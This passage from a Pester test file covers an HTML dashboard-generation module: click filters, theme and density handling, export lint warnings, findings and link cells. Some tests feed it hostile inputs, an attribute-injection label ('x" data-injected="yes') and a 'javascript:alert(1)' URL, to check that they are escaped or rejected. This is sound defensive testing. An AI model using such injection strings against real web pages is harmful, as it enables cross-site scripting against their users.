#
# Binding with addEventListener inside the IIFE fixes both at once: the label
# is captured as a JS value and never reaches the markup.
#
# The same pass extracted TableEngine.prototype.applyTextFilter. Three call
# sites (search box, pie slice, bar click) each carried a partial copy of the
# "apply a text filter" sequence and had drifted apart.
# ---------------------------------------------------------------------------
Describe 'Bar-chart click filters bind a real handler (v2.1.3)' {

    BeforeAll {
        $script:tmpDir = Join-Path ([IO.Path]::GetTempPath()) ('DH_Click_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $script:tmpDir | Out-Null

        # the two hostile labels are the point: a plain double quote, and a
        # payload that tries to open an attribute of its own
        $rows = @(
            @{ Name = 'a'; Kind = 'X' }
            @{ Name = 'b'; Kind = 'Y' }
            @{ Name = 'c'; Kind = 'say "hi"' }
            @{ Name = 'd'; Kind = 'x" data-injected="yes' }
        )
        $r = New-DhDashboard -Title 'click filters'
        Add-DhTable    -Report $r -TableId 'items' -Title 'Items' -Data $rows
        Add-DhBarChart -Report $r -Id 'bc' -Title 'By kind' -TableId 'items' -Field 'Kind' -ClickFilters
        Add-DhPieChart -Report $r -Id 'pc' -Title 'Pie'     -TableId 'items' -Field 'Kind' -ClickFilters
        Add-DhBarChart -Report $r -Id 'bc2' -Title 'No click' -TableId 'items' -Field 'Kind'

        $script:htmlPath = Join-Path $script:tmpDir 'click.html'
        Export-DhDashboard -Report $r -OutputPath $script:htmlPath -Force
        $script:html = Get-Content $script:htmlPath -Raw
    }

    AfterAll {
        if ($script:tmpDir -and (Test-Path -LiteralPath $script:tmpDir)) {
            Remove-Item $script:tmpDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'emits no inline event-handler attribute anywhere in the document' {
        # the whole class of defect, not just the one occurrence: an inline
        # handler cannot see anything inside the IIFE
        $script:html | Should -Not -Match 'onclick="\(function'
        $script:html | Should -Not -Match "var eng=engines\["
    }

    It 'does not take the shortcut of leaking the registry to window' {
        # exposing engines globally would have made the inline handler work and
        # left the injection sink in place
        $script:html | Should -Not -Match 'window\.engines'
    }

    It 'ships applyTextFilter as the single filter entry point' {
        $script:html | Should -Match 'TableEngine\.prototype\.applyTextFilter'
    }

    It 'applyTextFilter performs the whole sequence, not part of it' {
        $body = [regex]::Match($script:html,
            'TableEngine\.prototype\.applyTextFilter\s*=\s*function\s*\(value\)\s*\{(.*?)\n  \};', 'Singleline')
        $body.Success | Should -BeTrue
        $t = $body.Groups[1].Value
        # each of these was missing from at least one of the three old copies
        $t | Should -Match 'filter-clear-'              # pie + bar never revealed the clear button
        $t | Should -Match '_refreshLinkedBarCharts'    # pie + bar left linked charts stale
        $t | Should -Match '_renderCharts'              # ditto for in-table charts
        $t | Should -Match 'URLState\.save'             # bar never persisted to the hash
        $t | Should -Match 'currentPage = 1'
    }

    It 'routes every caller through it instead of keeping its own copy' {
        $script:html | Should -Match "inp\.addEventListener\('input',function\(\)\{ self\.applyTextFilter\(inp\.value\); \}\)"
        $script:html | Should -Match "clr\.addEventListener\('click',function\(\)\{ self\.applyTextFilter\(''\); \}\)"
        $script:html | Should -Match 'if \(eng\) eng\.applyTextFilter\(entry\.label\)'   # pie
        $script:html | Should -Match 'engine\.applyTextFilter\(label\)'                  # bar
    }

    It 'binds the bar handler with addEventListener, after the innerHTML write' {
        $fn = [regex]::Match($script:html,
            'function renderBarChart\(container, block\) \{(.*?)\n  \}\n', 'Singleline')
        $fn.Success | Should -BeTrue
        $t = $fn.Groups[1].Value
        # v2.2.0 - binding lives in bindBarClicks, shared with future callers
        $script:html | Should -Match "addEventListener\('click', applyBar\)"
        # order matters - the elements do not exist before the assignment
        $idxHtml = $t.IndexOf('container.innerHTML')
        $idxBind = $t.IndexOf('bindBarClicks(container')
        $idxHtml | Should -BeGreaterThan -1
        $idxBind | Should -BeGreaterThan $idxHtml -Because 'binding before the innerHTML write would find no elements'
    }

    It 'never writes the bar label into an attribute' {
        # the old line hand-rolled label.replace(/'/g,"\'") into the markup.
        # The label is now closed over as a value, so there is nothing to escape.
        $script:html | Should -Not -Match "label\.replace\(/'/g"
        $script:html | Should -Not -Match "e\.label\.replace"
        # the click affordance is a fixed pair of attributes
        $script:html | Should -Match 'opts\.clickable \? '' role="button" tabindex="0"'' : '''''
    }

    It 'carries a quote-bearing label as data only, exactly once' {
        # NOTE this is NOT the guard against the injection itself. The bars are
        # built by JS at runtime, so an injected attribute never appears in the
        # emitted file - only in the live DOM. The source-level guard is the
        # test above ('never writes the bar label into an attribute'); runtime
        # absence is verified in the browser pass.
        #
        # What this pins is that the hostile value round-trips as escaped JSON
        # ("Kind":"x\" data-injected=\"yes") and does not corrupt the document:
        # one occurrence, in the data, with the quote escaped.
        $script:html | Should -Match 'data-injected=\\"yes' -Because 'the value is legitimate table data and must survive intact'
        ([regex]::Matches($script:html, 'data-injected')).Count |
            Should -Be 1 -Because 'the payload belongs in TABLES_CONFIG and nowhere else'
    }

    It 'makes clickable bars keyboard-operable, and only clickable ones' {
        $script:html | Should -Match "ev\.key === 'Enter' \|\| ev\.key === ' '"
        $script:html | Should -Match '\.bar-item\.bar-clickable:focus-visible \{'
        # role/tabindex are conditional on clickFilters, not unconditional
        $script:html | Should -Not -Match '<div class="bar-item.*role="button"'
    }

    It 'emits a well-formed table toolbar' {
        # the start tag was missing its '>', so .toolbar-left was swallowed as
        # attributes and .toolbar-right escaped the toolbar entirely - the row
        # count and export buttons dropped onto a second row on every report
        $script:html | Should -Match 'id="toolbar-items">'
        $script:html | Should -Not -Match 'id="toolbar-items"\s*\r?\n'
        $script:html | Should -Match '<div class="toolbar-left">'
    }
}

# ---------------------------------------------------------------------------
# v2.1.4 - fixes from NewFeatures\plan-v2.2.md (F1-F8) plus the extra items
# found when that plan was verified against the source. Each Context names
# the plan item it guards.
# ---------------------------------------------------------------------------
Describe 'v2.1.4 fixes' {

    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        $rows = @(
            [pscustomobject]@{ Name = 'a'; Status = 'ok';  Ms = 10 }
            [pscustomobject]@{ Name = 'b'; Status = 'bad'; Ms = 20 }
        )
        $r = New-DhDashboard -Title 'v214'
        Add-DhTable -Report $r -TableId 'vms' -Title 'VMs' -Data $rows -Collapsible $true -DefaultOpen $false `
            -ExportFileName 'vm-export' -Charts @(
                @{ Field = 'Status' }                          # no Type   -> donut
                @{ Field = 'Name'; Type = 'Pie' }              # explicit  -> solid pie, case-insensitive
            )
        Add-DhSummary -Report $r -Items @(@{ Label = 'Bad'; Value = 1; Action = @{ TableId = 'vms'; Filter = 'bad' } })
        $script:report214 = $r
        $script:html      = Export-DhTestHtml -Report $r
    }

    Context 'F1 - collapsible tables can be opened again' {
        It 'binds the class Build-DhTableSections actually emits' {
            $script:html | Should -Match 'id="tsect-toggle-vms"'
            $fn = Get-DhTestJsFunction -Html $script:html -Name 'initTableCollapsibles'
            $fn | Should -Match "querySelectorAll\('\.table-section-toggle'\)"
            $fn | Should -Match "'tsect-body-'"
            $fn | Should -Match "classList\.toggle\('open'\)"
            $fn | Should -Match 'aria-expanded'
        }
        It 'no longer binds the class that was never emitted' {
            $script:html | Should -Not -Match "querySelectorAll\('[^']*table-collapse-toggle"
        }
    }

    Context 'F2 - table chart types' {
        It 'keeps a donut when Type is omitted and honours an explicit pie' {
            $charts = @($script:report214.Tables[0].Charts)
            $charts[0].Type | Should -Be 'donut'
            $charts[1].Type | Should -Be 'pie'
            $script:html | Should -Match '"type":"donut"'
            $script:html | Should -Match '"type":"pie"'
            $script:html | Should -Match "style:\s+style === 'pie' \? 'pie' : 'donut'"
        }
        It 'keeps Type bar (rendered since 2.2.0) with a count aggregate by default' {
            $r = New-DhDashboard -Title 'x'
            Add-DhTable -Report $r -TableId 't' -Title 'T' -Data @([pscustomobject]@{ A = 1 }) `
                -Charts @(@{ Field = 'A'; Type = 'bar' }) -WarningVariable w -WarningAction SilentlyContinue
            @($r.Tables[0].Charts).Count | Should -Be 1
            $r.Tables[0].Charts[0].Aggregate | Should -Be 'count'
            @($w).Count | Should -Be 0
        }
        It 'warns on an unknown Type and does not throw (plan D4)' {
            $r = New-DhDashboard -Title 'x'
            { Add-DhTable -Report $r -TableId 't' -Title 'T' -Data @([pscustomobject]@{ A = 1 }) `
                -Charts @(@{ Field = 'A'; Type = 'line' }) -WarningAction SilentlyContinue } | Should -Not -Throw
            @($r.Tables[0].Charts).Count | Should -Be 0
        }
    }

    Context 'F3 - CSV honours -ExportFileName' {
        It 'names the CSV after exportFileName like XLSX and PDF' {
            $script:html | Should -Match "this\.exportFileName\+'\.csv'"
            $script:html | Should -Not -Match "this\.id\+'\.csv'"
        }
        It 'context menu items use classes, not ids duplicated per table' {
            $script:html | Should -Not -Match 'id="ctx-copy-'
            $script:html | Should -Match "querySelector\('\.ctx-copy-csv'\)"
            $script:html | Should -Match "execCommand\('copy'\)"
        }
    }

    Context 'F4 - theme persists' {
        It 'writes the theme into URL state' {
            $script:html | Should -Match 'if \(themeChosen\) state\.theme = themeMode;'
        }
        It 'touches localStorage only inside try/catch' {
            foreach ($fn in 'themeStoreGet', 'themeStoreSet') {
                Get-DhTestJsFunction -Html $script:html -Name $fn | Should -Match '(?s)try \{.*localStorage.*\} catch'
            }
        }
        It 'restores the theme in the head, before first paint' {
            $head = $script:html.Substring(0, $script:html.IndexOf('</head>'))
            $head | Should -Match "localStorage\.getItem\('dh-theme'\)"
            $head | Should -Match "getElementById\('theme-alternate'\)\.media=''"
        }
        It 'labels the toggle with the mode, not the internal theme name' {
            Get-DhTestJsFunction -Html $script:html -Name 'themeLabel' | Should -Match 'Dark'
            $script:html | Should -Not -Match "btn\.textContent\s*=\s*'.+ ' \+ alternateName"
        }
    }

    Context 'F5 - density restore stays in sync' {
        It 'keeps one mode/label table and a shared position' {
            $script:html | Should -Match 'var DENSITY = \{'
            $script:html | Should -Match 'DENSITY\.set\(_saved\.density\)'
            $script:html | Should -Not -Match ([string][char]0x229A)   # the old Boot-only Spacious glyph
        }
    }

    Context 'F6 - one jump-to-table path' {
        It 'exposes window._dhJumpToTable and filters through applyTextFilter' {
            $fn = Get-DhTestJsFunction -Html $script:html -Name 'jumpToTable'
            $fn | Should -Match 'eng\.applyTextFilter\('
            $script:html | Should -Match 'window\._dhJumpToTable = jumpToTable;'
        }
        It 'leaves no caller setting filterText directly' {
            $script:html | Should -Not -Match 'eng\.filterText\s*='
            # alert action, tile action, status-grid cell, topology node
            ([regex]::Matches($script:html, '(?<!function )jumpToTable\((alert\.action|item\.action|tableId)')).Count | Should -Be 4
        }
    }

    Context 'F7 - dangling references warn at export' {
        It 'warns for a status-grid LinkTableId, a topology LinkTableId, tile and alert actions' {
            $r = New-DhDashboard -Title 'lint'
            Add-DhTable -Report $r -TableId 'real' -Title 'R' -Data @([pscustomobject]@{ A = 1 })
            Add-DhStatusGrid -Report $r -Id 'sg' -Title 'S' -Rows @('r') -Columns @('c') `
                -Cells @(@{ Row = 'r'; Column = 'c'; Status = 'ok'; LinkTableId = 'ghost-grid' })
            Add-DhTopologyMap -Report $r -Id 'tm' -Title 'T' -Nodes @(@{ Id = 'n'; Label = 'N'; LinkTableId = 'ghost-topo' })
            Add-DhSummary -Report $r -Items @(@{ Label = 'K'; Value = 1; Action = @{ TableId = 'ghost-tile' } })
            Add-DhAlertBanner -Report $r -Id 'al' -Message 'm' -Action @{ Label = 'go'; TableId = 'ghost-alert' }
            $res = Export-DhTestHtml -Report $r -WithWarnings
            $all = $res.Warnings -join "`n"
            foreach ($g in 'ghost-grid', 'ghost-topo', 'ghost-tile', 'ghost-alert') { $all | Should -Match $g }
        }
        It 'warns for an unknown BlockType' {
            $r = New-DhDashboard -Title 'lint'
            Add-DhHtmlBlock -Report $r -Id 'h' -Content 'x'
            $r.Blocks.Add(@{ BlockType = 'nosuchblock'; Id = 'zz'; NavGroup = ''; NavSubGroup = ''; NavPath = ''; NavSegments = @(); NavScope = 'Global'; NavLabel = ''; NavOrder = 0; NavSeqNo = 99 })
            $res = Export-DhTestHtml -Report $r -WithWarnings
            ($res.Warnings -join "`n") | Should -Match "unknown BlockType 'nosuchblock'"
        }
        It 'says nothing about a clean report' {
            $res = Export-DhTestHtml -Report $script:report214 -WithWarnings
            ($res.Warnings -join "`n") | Should -Not -Match 'is not a table in this report|unknown BlockType'
        }
        It 'accepts a chart declared before its table, and the export lint stays quiet once the table exists' {
            # the runtime renders table-fed blocks after every engine exists, so
            # declaration order does not matter (checked in a browser for 2.1.4)
            $r = New-DhDashboard -Title 'order'
            { Add-DhBarChart -Report $r -Id 'b' -Title 'B' -TableId 'later' -Field 'A' } | Should -Not -Throw
            { Add-DhPieChart -Report $r -Id 'p' -Title 'P' -TableId 'later' -Field 'A' } | Should -Not -Throw
            { Add-DhFilterCard -Report $r -Id 'f' -Title 'F' -TargetTableId 'later' -FilterField 'A' -Cards @(@{ Label = 'a'; Value = 'a' }) } | Should -Not -Throw
            $before = Export-DhTestHtml -Report $r -WithWarnings
            ($before.Warnings | Where-Object { $_ -match "'later' is not a table" }).Count | Should -Be 3
            Add-DhTable -Report $r -TableId 'later' -Title 'L' -Data @([pscustomobject]@{ A = 1 })
            $after = Export-DhTestHtml -Report $r -WithWarnings
            ($after.Warnings -join "`n") | Should -Not -Match 'is not a table in this report'
        }
        It 'still throws for a wrong TableId once tables exist' {
            $r = New-DhDashboard -Title 'order'
            Add-DhTable -Report $r -TableId 'real' -Title 'R' -Data @([pscustomobject]@{ A = 1 })
            { Add-DhBarChart -Report $r -Id 'b' -Title 'B' -TableId 'typo' -Field 'A' } | Should -Throw '*not found*'
        }
    }

    Context 'F8 and performance' {
        It 'esc() encodes the single quote' {
            Get-DhTestJsFunction -Html $script:html -Name 'esc' | Should -Match "replace\(/'/g,'&#39;'\)"
        }
        It 'looks rows up in a map, not with a linear indexOf per row' {
            $script:html | Should -Not -Match '\.allData\.indexOf\('
            $script:html | Should -Match 'this\._rowIdx\s+= new Map\(\)'
        }
    }

    Context 'Tooling drift - Add-DhRangeBar' {
        It 'is a block cmdlet in Update-DhScript, Test-DhV2Upgrade and Build-DhReference' {
            $root = Join-Path $PSScriptRoot '..'
            foreach ($f in 'DashHtml.Design/Public/Update-DhScript.ps1', 'Tools/Test-DhV2Upgrade.ps1') {
                $src  = Get-Content (Join-Path $root $f) -Raw
                $list = [regex]::Match($src, '(?s)\$blockCmds = @\((.*?)\r?\n\s*\)').Groups[1].Value
                $list | Should -Match "'Add-DhRangeBar'" -Because $f
            }
            Get-Content (Join-Path $root 'Build-DhReference.ps1') -Raw | Should -Match "'Add-DhRangeBar'\s+= @\{"
        }
    }

    Context 'Runtime JS under Node' {
        It 'the shipped nav matcher agrees with Test-DhNavMatch, and the table toggle works' {
            $node = Get-Command node -ErrorAction SilentlyContinue
            if (-not $node) { Set-ItResult -Skipped -Because 'node is not on PATH'; return }
            $cases = InModuleScope DashHtml {
                $paths = @(@(), @('A'), @('A','B'), @('A','B','C'), @('A','X'), @('a'))
                foreach ($scope in 'Exact', 'Subtree', 'Global') {
                    foreach ($d in $paths) {
                        foreach ($s in $paths) {
                            [pscustomobject]@{ declared = @($d); selected = @($s); scope = $scope
                                               expected = [bool](Test-DhNavMatch -DeclaredPath $d -SelectedPath $s -Scope $scope) }
                        }
                    }
                }
            }
            $json = Join-Path ([IO.Path]::GetTempPath()) ('dh_nav_' + [guid]::NewGuid().ToString('N') + '.json')
            try {
                ConvertTo-Json -InputObject @($cases) -Depth 4 | Set-Content -LiteralPath $json -Encoding utf8NoBOM
                $jsTest = Join-Path $PSScriptRoot 'js/nav.test.js'
                $out = & $node.Source $jsTest $json 2>&1
                $LASTEXITCODE | Should -Be 0 -Because ($out -join "`n")
                ($out -join "`n") | Should -Match '0 failed \(108 matcher cases\)'
            } finally { if (Test-Path -LiteralPath $json) { Remove-Item -LiteralPath $json } }
        }
    }
}

# ---------------------------------------------------------------------------
# v2.2.0 - assessment features from NewFeatures\plan-v2.2.md (N1-N8).
# Browser behaviour (rendered values, filters, offline export, print layout)
# was verified in a real browser and headless Edge; these pin the contracts
# that make it work, so a refactor cannot quietly break them.
# ---------------------------------------------------------------------------
Describe 'v2.2.0 features' {

    BeforeAll {
        . (Join-Path $PSScriptRoot 'DhTestHelpers.ps1')
        $script:rows = foreach ($i in 1..12) {
            [pscustomobject]@{ DC = "DC$($i % 3)"; Lag = $i * 2; Result = @('ok', 'fail')[$i % 2]; Doc = "https://example.com/$i" }
        }
        $script:newReport = {
            $r = New-DhDashboard -Title 't'
            Add-DhTable -Report $r -TableId 'repl' -Title 'R' -Data $script:rows
            $r
        }
    }

    Context 'Refactor - one tile serialiser' {
        It 'Export uses ConvertTo-DhTileJson for both the global strip and per-panel strips' {
            $src = Get-Content (Join-Path $PSScriptRoot '../DashHtml/Public/Export-DhDashboard.ps1') -Raw
            ([regex]::Matches($src, 'ConvertTo-DhTileJson -Item')).Count | Should -Be 2
            $src | Should -Not -Match '\$deltaJson2'
        }
        It 'emits the same tile JSON on both paths' {
            $r = & $script:newReport
            $tile = @{ Label = 'Same'; Value = 7; Previous = 5; Sparkline = @(1, 2) }
            Add-DhSummary -Report $r -Items @($tile)
            Add-DhSummary -Report $r -Items @($tile) -NavPath 'X' -Id 'strip'
            $html = Export-DhTestHtml -Report $r
            $json = '{"label":"Same","value":7,'
            ([regex]::Matches($html, [regex]::Escape($json))).Count | Should -Be 2
        }
    }

    Context 'N2 - Add-DhBarChart value aggregation' {
        It 'rejects an aggregate other than count without a ValueField' {
            $r = & $script:newReport
            { Add-DhBarChart -Report $r -Id 'b' -Title 'B' -TableId 'repl' -Field 'DC' -Aggregate sum } | Should -Throw '*needs a ValueField*'
            { Add-DhBarChart -Report $r -Id 'b' -Title 'B' -TableId 'repl' -Field 'DC' -Aggregate avg } | Should -Throw '*needs a ValueField*'
        }
        It 'treats a ValueField on its own as sum' {
            $r = & $script:newReport
            Add-DhBarChart -Report $r -Id 'b' -Title 'B' -TableId 'repl' -Field 'DC' -ValueField 'Lag'
            $r.Blocks[0].Aggregate | Should -Be 'sum'
        }
        It 'rejects a ValueField the table does not have (case-sensitive)' {
            $r = & $script:newReport
            { Add-DhBarChart -Report $r -Id 'b' -Title 'B' -TableId 'repl' -Field 'DC' -ValueField 'lag' -Aggregate max } | Should -Throw '*not a field*'
        }
        It 'allows only count or sum when stacked' {
            $r = & $script:newReport
            { Add-DhBarChart -Report $r -Id 'b' -Title 'B' -TableId 'repl' -Field 'DC' -SeriesField 'Result' -ValueField 'Lag' -Aggregate avg } | Should -Throw '*count or sum*'
            { Add-DhBarChart -Report $r -Id 'b2' -Title 'B' -TableId 'repl' -Field 'DC' -SeriesField 'Result' -ValueField 'Lag' -Aggregate sum } | Should -Not -Throw
        }
        It 'carries valueField / aggregate / unit / decimals to the browser, and nothing extra for a count' {
            $r = & $script:newReport
            Add-DhBarChart -Report $r -Id 'avg' -Title 'A' -TableId 'repl' -Field 'DC' -ValueField 'Lag' -Aggregate avg -Unit 'min' -Decimals 1
            Add-DhBarChart -Report $r -Id 'cnt' -Title 'C' -TableId 'repl' -Field 'DC'
            $html = Export-DhTestHtml -Report $r
            $html | Should -Match '"id":"avg"[^}]*"valueField":"Lag","aggregate":"avg","unit":"min","decimals":1'
            $html | Should -Match '"id":"cnt","title":"C","tableId":"repl","field":"DC","topN":10,"showCount":true,"showPercent":false,"clickFilters":false,"stacked":false,"seriesField":"","collapsible"'
        }
        It 'checks a ValueField at export when the chart came before its table' {
            $r = New-DhDashboard -Title 't'
            Add-DhBarChart -Report $r -Id 'early' -Title 'E' -TableId 'repl' -Field 'DC' -ValueField 'Nope' -Aggregate max
            Add-DhTable -Report $r -TableId 'repl' -Title 'R' -Data $script:rows
            (Export-DhTestHtml -Report $r -WithWarnings).Warnings -join "`n" | Should -Match "ValueField 'Nope' is not a field of table 'repl'"
        }
        It 'ships one aggregation used by bar blocks and table charts alike' {
            $html = Export-DhTestHtml -Report (& $script:newReport)
            Get-DhTestJsFunction -Html $html -Name 'aggregateBars' | Should -Match "case 'avg'"
            Get-DhTestJsFunction -Html $html -Name 'renderBarChart' | Should -Match 'aggregateBars\('
            Get-DhTestJsFunction -Html $html -Name '_buildBarChart' | Should -Match 'aggregateBars\('
        }
    }

    Context 'N3 - table chart Type bar' {
        It 'stores and emits the bar options' {
            $r = New-DhDashboard -Title 't'
            Add-DhTable -Report $r -TableId 'repl' -Title 'R' -Data $script:rows `
                -Charts @(@{ Field = 'DC'; Type = 'Bar'; ValueField = 'Lag'; Aggregate = 'MAX'; TopN = 2; Unit = 'ms' })
            $c = $r.Tables[0].Charts[0]
            $c.Type | Should -Be 'bar'; $c.Aggregate | Should -Be 'max'; $c.TopN | Should -Be 2
            Export-DhTestHtml -Report $r | Should -Match '"type":"bar","valueField":"Lag","aggregate":"max","topN":2,"unit":"ms","decimals":-1'
        }
        It 'rejects a bar chart over a field the table lacks' {
            $r = New-DhDashboard -Title 't'
            { Add-DhTable -Report $r -TableId 'repl' -Title 'R' -Data $script:rows -Charts @(@{ Field = 'DC'; Type = 'bar'; ValueField = 'Missing'; Aggregate = 'sum' }) } |
                Should -Throw '*not a field*'
        }
    }

    Context 'N1 - Add-DhFindings' {
        BeforeAll {
            $script:fr = & $script:newReport
            Add-DhFindings -Report $script:fr -Id 'sec' -Title 'Findings' -NavPath 'Security' -GroupBy Area -ExpandSeverity High -Findings @(
                @{ Severity = 'low'; Title = 'Info item'; Area = 'B'; AffectedCount = 900 }
                @{ Severity = 'Medium'; Title = 'Small warning'; Area = 'A'; Affected = @('x') }
                @{ Severity = 'warning'; Title = 'Big warning'; Area = 'A'; Affected = @('x', 'y', 'z'); AffectedTableId = 'repl'; AffectedFilter = 'fail' }
                @{ Severity = 'HIGH'; Title = 'Crit <b>'; Area = 'A'; References = @(@{ Label = 'Docs'; Url = 'https://learn.microsoft.com/' }) }
                @{ Severity = 'ok'; Title = 'Fine'; Area = 'B' }
            )
            $script:fhtml = Export-DhTestHtml -Report $script:fr -WithWarnings
            $script:fb = $script:fr.Blocks | Where-Object { $_.Id -eq 'sec' }
        }
        It 'normalises severity aliases and sorts critical first, then by affected count' {
            @($script:fb.Findings | ForEach-Object { "$($_.Severity):$($_.Title)" }) |
                Should -Be @('critical:Crit <b>', 'warning:Big warning', 'warning:Small warning', 'info:Info item', 'ok:Fine')
            $script:fb.ExpandSeverity | Should -Be @('critical')
        }
        It 'defaults AffectedCount to the number of Affected names' {
            ($script:fb.Findings | Where-Object Title -eq 'Big warning').AffectedCount | Should -Be 3
        }
        It 'emits a findings block that sits on its nav path' {
            $script:fhtml.Html | Should -Match '"blockType":"findings","id":"sec"'
            $script:fhtml.Html | Should -Match 'id="bsection-sec"[^>]*data-navpath="\[&quot;Security&quot;\]"'
            ($script:fhtml.Warnings -join "`n") | Should -Not -Match 'findings'
        }
        It 'rejects an unknown severity, a missing title and AffectedFilter without AffectedTableId' {
            $r = & $script:newReport
            { Add-DhFindings -Report $r -Id 'a' -Findings @(@{ Severity = 'severe'; Title = 'x' }) } | Should -Throw '*Severity must be*'
            { Add-DhFindings -Report $r -Id 'b' -Findings @(@{ Severity = 'ok' }) } | Should -Throw '*no Title*'
            { Add-DhFindings -Report $r -Id 'c' -Findings @(@{ Severity = 'ok'; Title = 'x'; AffectedFilter = 'f' }) } | Should -Throw '*requires AffectedTableId*'
        }
        It 'refuses a javascript: reference URL' {
            $r = & $script:newReport
            { Add-DhFindings -Report $r -Id 'a' -Findings @(@{ Severity = 'ok'; Title = 'x'; References = @(@{ Label = 'evil'; Url = 'javascript:alert(1)' }) }) } |
                Should -Throw
        }
        It 'drops ok findings with -HideOk and rejects duplicate finding ids' {
            $r = & $script:newReport
            Add-DhFindings -Report $r -Id 'a' -HideOk -Findings @(@{ Severity = 'ok'; Title = 'x' }, @{ Severity = 'info'; Title = 'y' })
            @($r.Blocks[0].Findings).Count | Should -Be 1
            { Add-DhFindings -Report $r -Id 'b' -Findings @(@{ Severity = 'ok'; Title = 'x'; Id = 'k' }, @{ Severity = 'ok'; Title = 'y'; Id = 'k' }) } | Should -Throw '*duplicate*'
        }
        It 'warns at export when AffectedTableId names no table' {
            $r = & $script:newReport
            Add-DhFindings -Report $r -Id 'a' -Findings @(@{ Severity = 'warning'; Title = 'x'; AffectedTableId = 'ghost' })
            (Export-DhTestHtml -Report $r -WithWarnings).Warnings -join "`n" | Should -Match "AffectedTableId 'ghost'"
        }
        It 'renders through esc(), checks reference schemes again and jumps through jumpToTable' {
            $fn = Get-DhTestJsFunction -Html $script:fhtml.Html -Name 'renderFindings'
            $fn | Should -Match 'esc\(f\.title\)'
            $fn | Should -Match 'FINDING_URL_OK\.test'
            $fn | Should -Match 'rel="noopener noreferrer"'
            $fn | Should -Match 'jumpToTable\(f\.affectedTableId, f\.affectedFilter\)'
            $fn | Should -Not -Match 'innerHTML\s*=\s*f\.'
        }
    }

    Context 'N6 - verdict tile' {
        It 'works in the global strip and in a per-panel strip, with the colour derived from the counts' {
            $r = & $script:newReport
            $v = @{ Label = 'Overall'; Value = 'Action required'; Style = 'Verdict'; Caption = 'c'; Counts = @{ High = 2; warning = 1 } }
            Add-DhSummary -Report $r -Items @($v)
            Add-DhSummary -Report $r -Items @($v) -NavPath 'X' -Id 'st'
            $r.Summary[0].Class | Should -Be 'cell-danger'
            $html = Export-DhTestHtml -Report $r
            ([regex]::Matches($html, '"class":"cell-danger"[^}]*"style":"verdict","caption":"c","counts":\{"critical":2,"warning":1\}')).Count | Should -Be 2
            Get-DhTestJsFunction -Html $html -Name 'buildTile' | Should -Match "case 'verdict':\s+tile = buildVerdictTile\(item\)"
        }
        It 'derives cell-warn and cell-ok, and keeps an explicit Class' {
            $r = & $script:newReport
            Add-DhSummary -Report $r -Items @(
                @{ Label = 'w'; Value = 'x'; Style = 'verdict'; Counts = @{ warning = 1; info = 4 } }
                @{ Label = 'o'; Value = 'x'; Style = 'verdict'; Counts = @{ ok = 9 } }
                @{ Label = 'e'; Value = 'x'; Style = 'verdict'; Counts = @{ critical = 1 }; Class = 'cell-nodata' }
            )
            @($r.Summary.Class) | Should -Be @('cell-warn', 'cell-ok', 'cell-nodata')
        }
        It 'rejects a bad count' {
            $r = & $script:newReport
            { Add-DhSummary -Report $r -Items @(@{ Label = 'v'; Value = 'x'; Style = 'verdict'; Counts = @{ critical = -1 } }) } | Should -Throw '*whole number*'
            { Add-DhSummary -Report $r -Items @(@{ Label = 'v'; Value = 'x'; Style = 'verdict'; Counts = @{ severe = 1 } }) } | Should -Throw '*Severity must be*'
        }
    }

    Context 'N8 - link cells' {
        It 'accepts CellType link, defaults UrlField to the column and emits both keys' {
            $r = New-DhDashboard -Title 't'
            Add-DhTable -Report $r -TableId 'repl' -Title 'R' -Data $script:rows -Columns @(
                @{ Field = 'DC'; Label = 'DC' }
                @{ Field = 'Doc'; Label = 'Doc'; CellType = 'link' }
                @{ Field = 'Ref'; Label = 'Ref'; CellType = 'link'; UrlField = 'Doc'; LinkText = 'Open' })
            $r.Tables[0].Columns[1].UrlField | Should -Be 'Doc'
            $html = Export-DhTestHtml -Report $r
            $html | Should -Match '"field":"Ref","label":"Ref","sortable":true,"cellType":"link"[^}]*"urlField":"Doc","linkText":"Open"'
        }
        It 'rejects a UrlField that is not in the data' {
            $r = New-DhDashboard -Title 't'
            { Add-DhTable -Report $r -TableId 'repl' -Title 'R' -Data $script:rows -Columns @(@{ Field = 'DC'; Label = 'DC'; CellType = 'link'; UrlField = 'Url' }) } |
                Should -Throw '*UrlField*'
        }
        It 'only links safe URLs, and builds the anchor without innerHTML' {
            $fn = Get-DhTestJsFunction -Html (Export-DhTestHtml -Report (& $script:newReport)) -Name '_renderCell'
            $fn | Should -Match 'this\._linkFor\(col, row, rawVal\)'   # v2.6.0: the allow-list is dhLinkUrl (node tests)
            $fn | Should -Match "document\.createElement\('a'\)"
            $fn | Should -Match "a\.rel = 'noopener noreferrer'"
        }
    }

    Context 'v2.7.0 - Density' {
        It 'defaults to normal and stores the chosen mode' {
            (New-DhDashboard -Title 't').Density | Should -Be 'normal'
            foreach ($d in 'Normal', 'Compact', 'Comfortable') {
                (New-DhDashboard -Title 't' -Density $d).Density | Should -Be $d.ToLowerInvariant()
            }
        }
        It 'writes the density on the html element' {
            foreach ($d in 'Normal', 'Compact', 'Comfortable') {
                $r = New-DhDashboard -Title 't' -Density $d
                Export-DhTestHtml -Report $r | Should -Match "data-density=`"$($d.ToLowerInvariant())`""
            }
        }
        It 'rejects an unknown density' {
            { New-DhDashboard -Title 't' -Density 'Roomy' } | Should -Throw
        }
        It 'applies the authored density at boot only when the URL carries no choice' {
            $html = Export-DhTestHtml -Report (New-DhDashboard -Title 't' -Density Compact)
            $html | Should -Match "getAttribute\('data-density'\)"
            $html | Should -Match "if \(_d && _d !== 'normal'\) DENSITY\.set\(_d\)"
        }
        It 'scales the type tokens, not only the table rows' {
            $html = Export-DhTestHtml -Report (New-DhDashboard -Title 't')
            $html | Should -Match 'body\.density-compact \{'
            $html | Should -Match 'body\.density-comfortable \{'
        }
    }

    Context 'N7 - ThemeMode' {
        It 'stores the mode and writes it on the html element' {
            foreach ($m in 'Light', 'Dark', 'Auto') {
                $r = New-DhDashboard -Title 't' -ThemeMode $m
                $r.ThemeMode | Should -Be $m.ToLowerInvariant()
                # v2.7.0 added data-density to the same element, so match the
                # attribute rather than the whole tag.
                Export-DhTestHtml -Report $r | Should -Match "<html lang=`"en`" data-theme-mode=`"$($m.ToLowerInvariant())`""
            }
        }
        It 'follows prefers-color-scheme for Auto, and a saved choice still wins' {
            $html = Export-DhTestHtml -Report (New-DhDashboard -Title 't' -ThemeMode Auto)
            $html | Should -Match "matchMedia\('\(prefers-color-scheme: dark\)'\)"
